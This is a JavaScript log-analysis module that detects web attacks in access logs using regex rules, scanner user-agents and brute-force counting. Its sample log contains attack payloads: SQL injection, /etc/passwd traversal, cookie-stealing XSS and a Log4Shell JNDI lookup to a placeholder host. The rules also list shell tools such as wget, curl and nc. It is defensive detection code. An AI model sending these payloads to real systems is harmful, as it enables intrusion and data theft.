// Pure logic: parse web access logs (Apache/nginx combined format) and hunt for attack patterns.
const LINE = /^(\S+) \S+ (\S+) \[([^\]]+)\] "([^"]*)" (\d{3}) (\S+)(?: "([^"]*)" "([^"]*)")?/;
const MONTHS = { Jan: 0, Feb: 1, Mar: 2, Apr: 3, May: 4, Jun: 5, Jul: 6, Aug: 7, Sep: 8, Oct: 9, Nov: 10, Dec: 11 };

export function parseTime(s) {
  const m = /^(\d{1,2})\/(\w{3})\/(\d{4}):(\d{2}):(\d{2}):(\d{2}) ([+-])(\d{2})(\d{2})$/.exec(s);
  if (!m || !(m[2] in MONTHS)) return null;
  const off = (m[7] === '-' ? -1 : 1) * (+m[8] * 60 + +m[9]);
  return Date.UTC(+m[3], MONTHS[m[2]], +m[1], +m[4], +m[5], +m[6]) - off * 60000;
}

export function parseLine(line) {
  const m = LINE.exec(line.trim());
  if (!m) return null;
  const req = m[4].split(' ');
  return {
    ip: m[1], user: m[2], time: parseTime(m[3]), method: req[0] || '',
    path: req[1] || '', status: +m[5], ua: m[8] || '', referrer: m[7] || '', raw: line.trim(),
  };
}

export function safeDecode(s) {
  let cur = s;
  for (let i = 0; i < 3; i++) {
    let next;
    try { next = decodeURIComponent(cur.replace(/\+/g, ' ')); } catch { next = cur.replace(/%([0-9a-f]{2})/gi, (_, h) => String.fromCharCode(parseInt(h, 16))); }
    if (next === cur) break;
    cur = next;
  }
  return cur;
}

export const RULES = [
  { id: 'sqli', name: 'SQL injection', severity: 'high',
    re: /(\bunion\b[\s/*]+(all[\s/*]+)?select\b|\bselect\b.+\bfrom\b|'\s*or\s*'?\d+'?\s*=\s*'?\d|\bor\s+1\s*=\s*1\b|(--|#)\s*$|sleep\s*\(\s*\d|benchmark\s*\(|information_schema|;\s*drop\s+table|\bwaitfor\s+delay\b)/i },
  { id: 'xss', name: 'Cross-site scripting', severity: 'high',
    re: /(<\s*script|javascript:|\bon(error|load|mouseover|focus)\s*=|<\s*img[^>]+src\s*=|<\s*svg[^>]*on\w+\s*=|document\.cookie)/i },
  { id: 'traversal', name: 'Path traversal / LFI', severity: 'high',
    re: /(\.\.[\/\\]|\/etc\/(passwd|shadow)|\bboot\.ini\b|\bwin\.ini\b|php:\/\/(filter|input)|\/proc\/self)/i },
  { id: 'cmdi', name: 'Command injection', severity: 'high',
    re: /([;|&`]\s*(cat|ls|id|whoami|wget|curl|nc|bash|sh|powershell)\b|\$\(\s*\w+|\/bin\/(ba)?sh)/i },
  { id: 'log4shell', name: 'Log4Shell / JNDI', severity: 'high', re: /\$\{\s*(jndi|\$\{)/i },
  { id: 'sensitive', name: 'Sensitive file probe', severity: 'medium',
    re: /(\/\.(env|git|svn|htaccess|htpasswd|aws|ssh)\b|wp-config|\/\.DS_Store|phpinfo|\/backup\.(zip|sql|tar)|\.bak$|id_rsa)/i },
  { id: 'admin', name: 'Admin panel probe', severity: 'low',
    re: /(\/(wp-admin|wp-login\.php|phpmyadmin|administrator|admin(\/|\.php|$)|manager\/html|cgi-bin))/i },
];

export const SCANNER_UA = /(sqlmap|nikto|nmap|masscan|acunetix|nessus|wpscan|dirbuster|gobuster|ffuf|hydra|zgrab|nuclei|burp)/i;

export function detect(entry) {
  const target = safeDecode(entry.path);
  const hits = [];
  for (const r of RULES) if (r.re.test(target)) hits.push(r.id);
  // Log4Shell payloads are commonly smuggled in headers too.
  if (!hits.includes('log4shell') && /\$\{\s*(jndi|\$\{)/i.test(safeDecode((entry.ua || '') + ' ' + (entry.referrer || '')))) hits.push('log4shell');
  if (SCANNER_UA.test(entry.ua)) hits.push('scanner');
  return hits;
}

/** Brute force: >= threshold failed (401/403) requests on same ip+path within windowSec. */
export function bruteForce(entries, { threshold = 5, windowSec = 60 } = {}) {
  const groups = new Map();
  for (const e of entries) {
    if ((e.status === 401 || e.status === 403) && e.time != null) {
      const k = e.ip + ' ' + e.path.split('?')[0];
      (groups.get(k) || groups.set(k, []).get(k)).push(e.time);
    }
  }
  const out = [];
  for (const [k, times] of groups) {
    times.sort((a, b) => a - b);
    let lo = 0, best = 0;
    for (let hi = 0; hi < times.length; hi++) {
      while (times[hi] - times[lo] > windowSec * 1000) lo++;
      best = Math.max(best, hi - lo + 1);
    }
    if (best >= threshold) {
      const i = k.indexOf(' ');
      out.push({ ip: k.slice(0, i), path: k.slice(i + 1), attempts: times.length, peak: best });
    }
  }
  return out.sort((a, b) => b.peak - a.peak);
}

export function analyze(text, opts = {}) {
  const lines = text.split(/\r?\n/).filter((l) => l.trim());
  const entries = [], bad = [];
  for (const l of lines) { const p = parseLine(l); p ? entries.push(p) : bad.push(l); }
  const findings = [];
  const perIp = new Map();
  const ipRec = (ip) => perIp.get(ip) || perIp.set(ip, { ip, requests: 0, errors: 0, categories: new Set(), score: 0 }).get(ip);
  const weight = { high: 5, medium: 3, low: 1, scanner: 4, brute: 8 };
  const sev = Object.fromEntries(RULES.map((r) => [r.id, r.severity]));
  for (const e of entries) {
    const rec = ipRec(e.ip);
    rec.requests++;
    if (e.status >= 400) rec.errors++;
    for (const id of detect(e)) {
      const rule = RULES.find((r) => r.id === id);
      const s = id === 'scanner' ? 'high' : sev[id];
      rec.categories.add(id);
      rec.score += weight[id === 'scanner' ? 'scanner' : s];
      findings.push({ id, name: rule ? rule.name : 'Scanner user-agent', severity: s, ip: e.ip, path: e.path, status: e.status, line: e.raw });
    }
  }
  const brute = bruteForce(entries, opts);
  for (const b of brute) { const rec = ipRec(b.ip); rec.categories.add('brute'); rec.score += weight.brute; }
  const ips = [...perIp.values()].map((r) => ({ ...r, categories: [...r.categories].sort() }))
    .filter((r) => r.score > 0).sort((a, b) => b.score - a.score);
  const counts = {};
  for (const f of findings) counts[f.id] = (counts[f.id] || 0) + 1;
  return { total: lines.length, parsed: entries.length, unparsed: bad.length, findings, brute, ips, counts };
}

export const EXAMPLE = [
  '203.0.113.7 - - [14/Nov/2026:10:00:01 +0000] "GET /index.html HTTP/1.1" 200 5123 "-" "Mozilla/5.0"',
  '198.51.100.23 - - [14/Nov/2026:10:01:10 +0000] "GET /products.php?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 812 "-" "Mozilla/5.0"',
  '198.51.100.23 - - [14/Nov/2026:10:01:12 +0000] "GET /products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 500 120 "-" "sqlmap/1.7"',
  '198.51.100.23 - - [14/Nov/2026:10:01:15 +0000] "GET /.env HTTP/1.1" 404 150 "-" "sqlmap/1.7"',
  '192.0.2.44 - - [14/Nov/2026:10:02:00 +0000] "POST /wp-login.php HTTP/1.1" 401 300 "-" "python-requests/2.31"',
  '192.0.2.44 - - [14/Nov/2026:10:02:03 +0000] "POST /wp-login.php HTTP/1.1" 401 300 "-" "python-requests/2.31"',
  '192.0.2.44 - - [14/Nov/2026:10:02:06 +0000] "POST /wp-login.php HTTP/1.1" 401 300 "-" "python-requests/2.31"',
  '192.0.2.44 - - [14/Nov/2026:10:02:09 +0000] "POST /wp-login.php HTTP/1.1" 401 300 "-" "python-requests/2.31"',
  '192.0.2.44 - - [14/Nov/2026:10:02:12 +0000] "POST /wp-login.php HTTP/1.1" 401 300 "-" "python-requests/2.31"',
  '192.0.2.44 - - [14/Nov/2026:10:02:15 +0000] "POST /wp-login.php HTTP/1.1" 200 4000 "-" "python-requests/2.31"',
  '203.0.113.99 - - [14/Nov/2026:10:03:00 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 400 90 "-" "curl/8.0"',
  '203.0.113.99 - - [14/Nov/2026:10:03:05 +0000] "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1" 200 700 "-" "Mozilla/5.0"',
  '203.0.113.99 - - [14/Nov/2026:10:03:09 +0000] "GET / HTTP/1.1" 200 700 "${jndi:ldap://x.example/a}" "${jndi:ldap://x.example/a}"',
  '203.0.113.7 - - [14/Nov/2026:10:04:00 +0000] "GET /about HTTP/1.1" 200 2100 "-" "Mozilla/5.0"',
].join('\n');
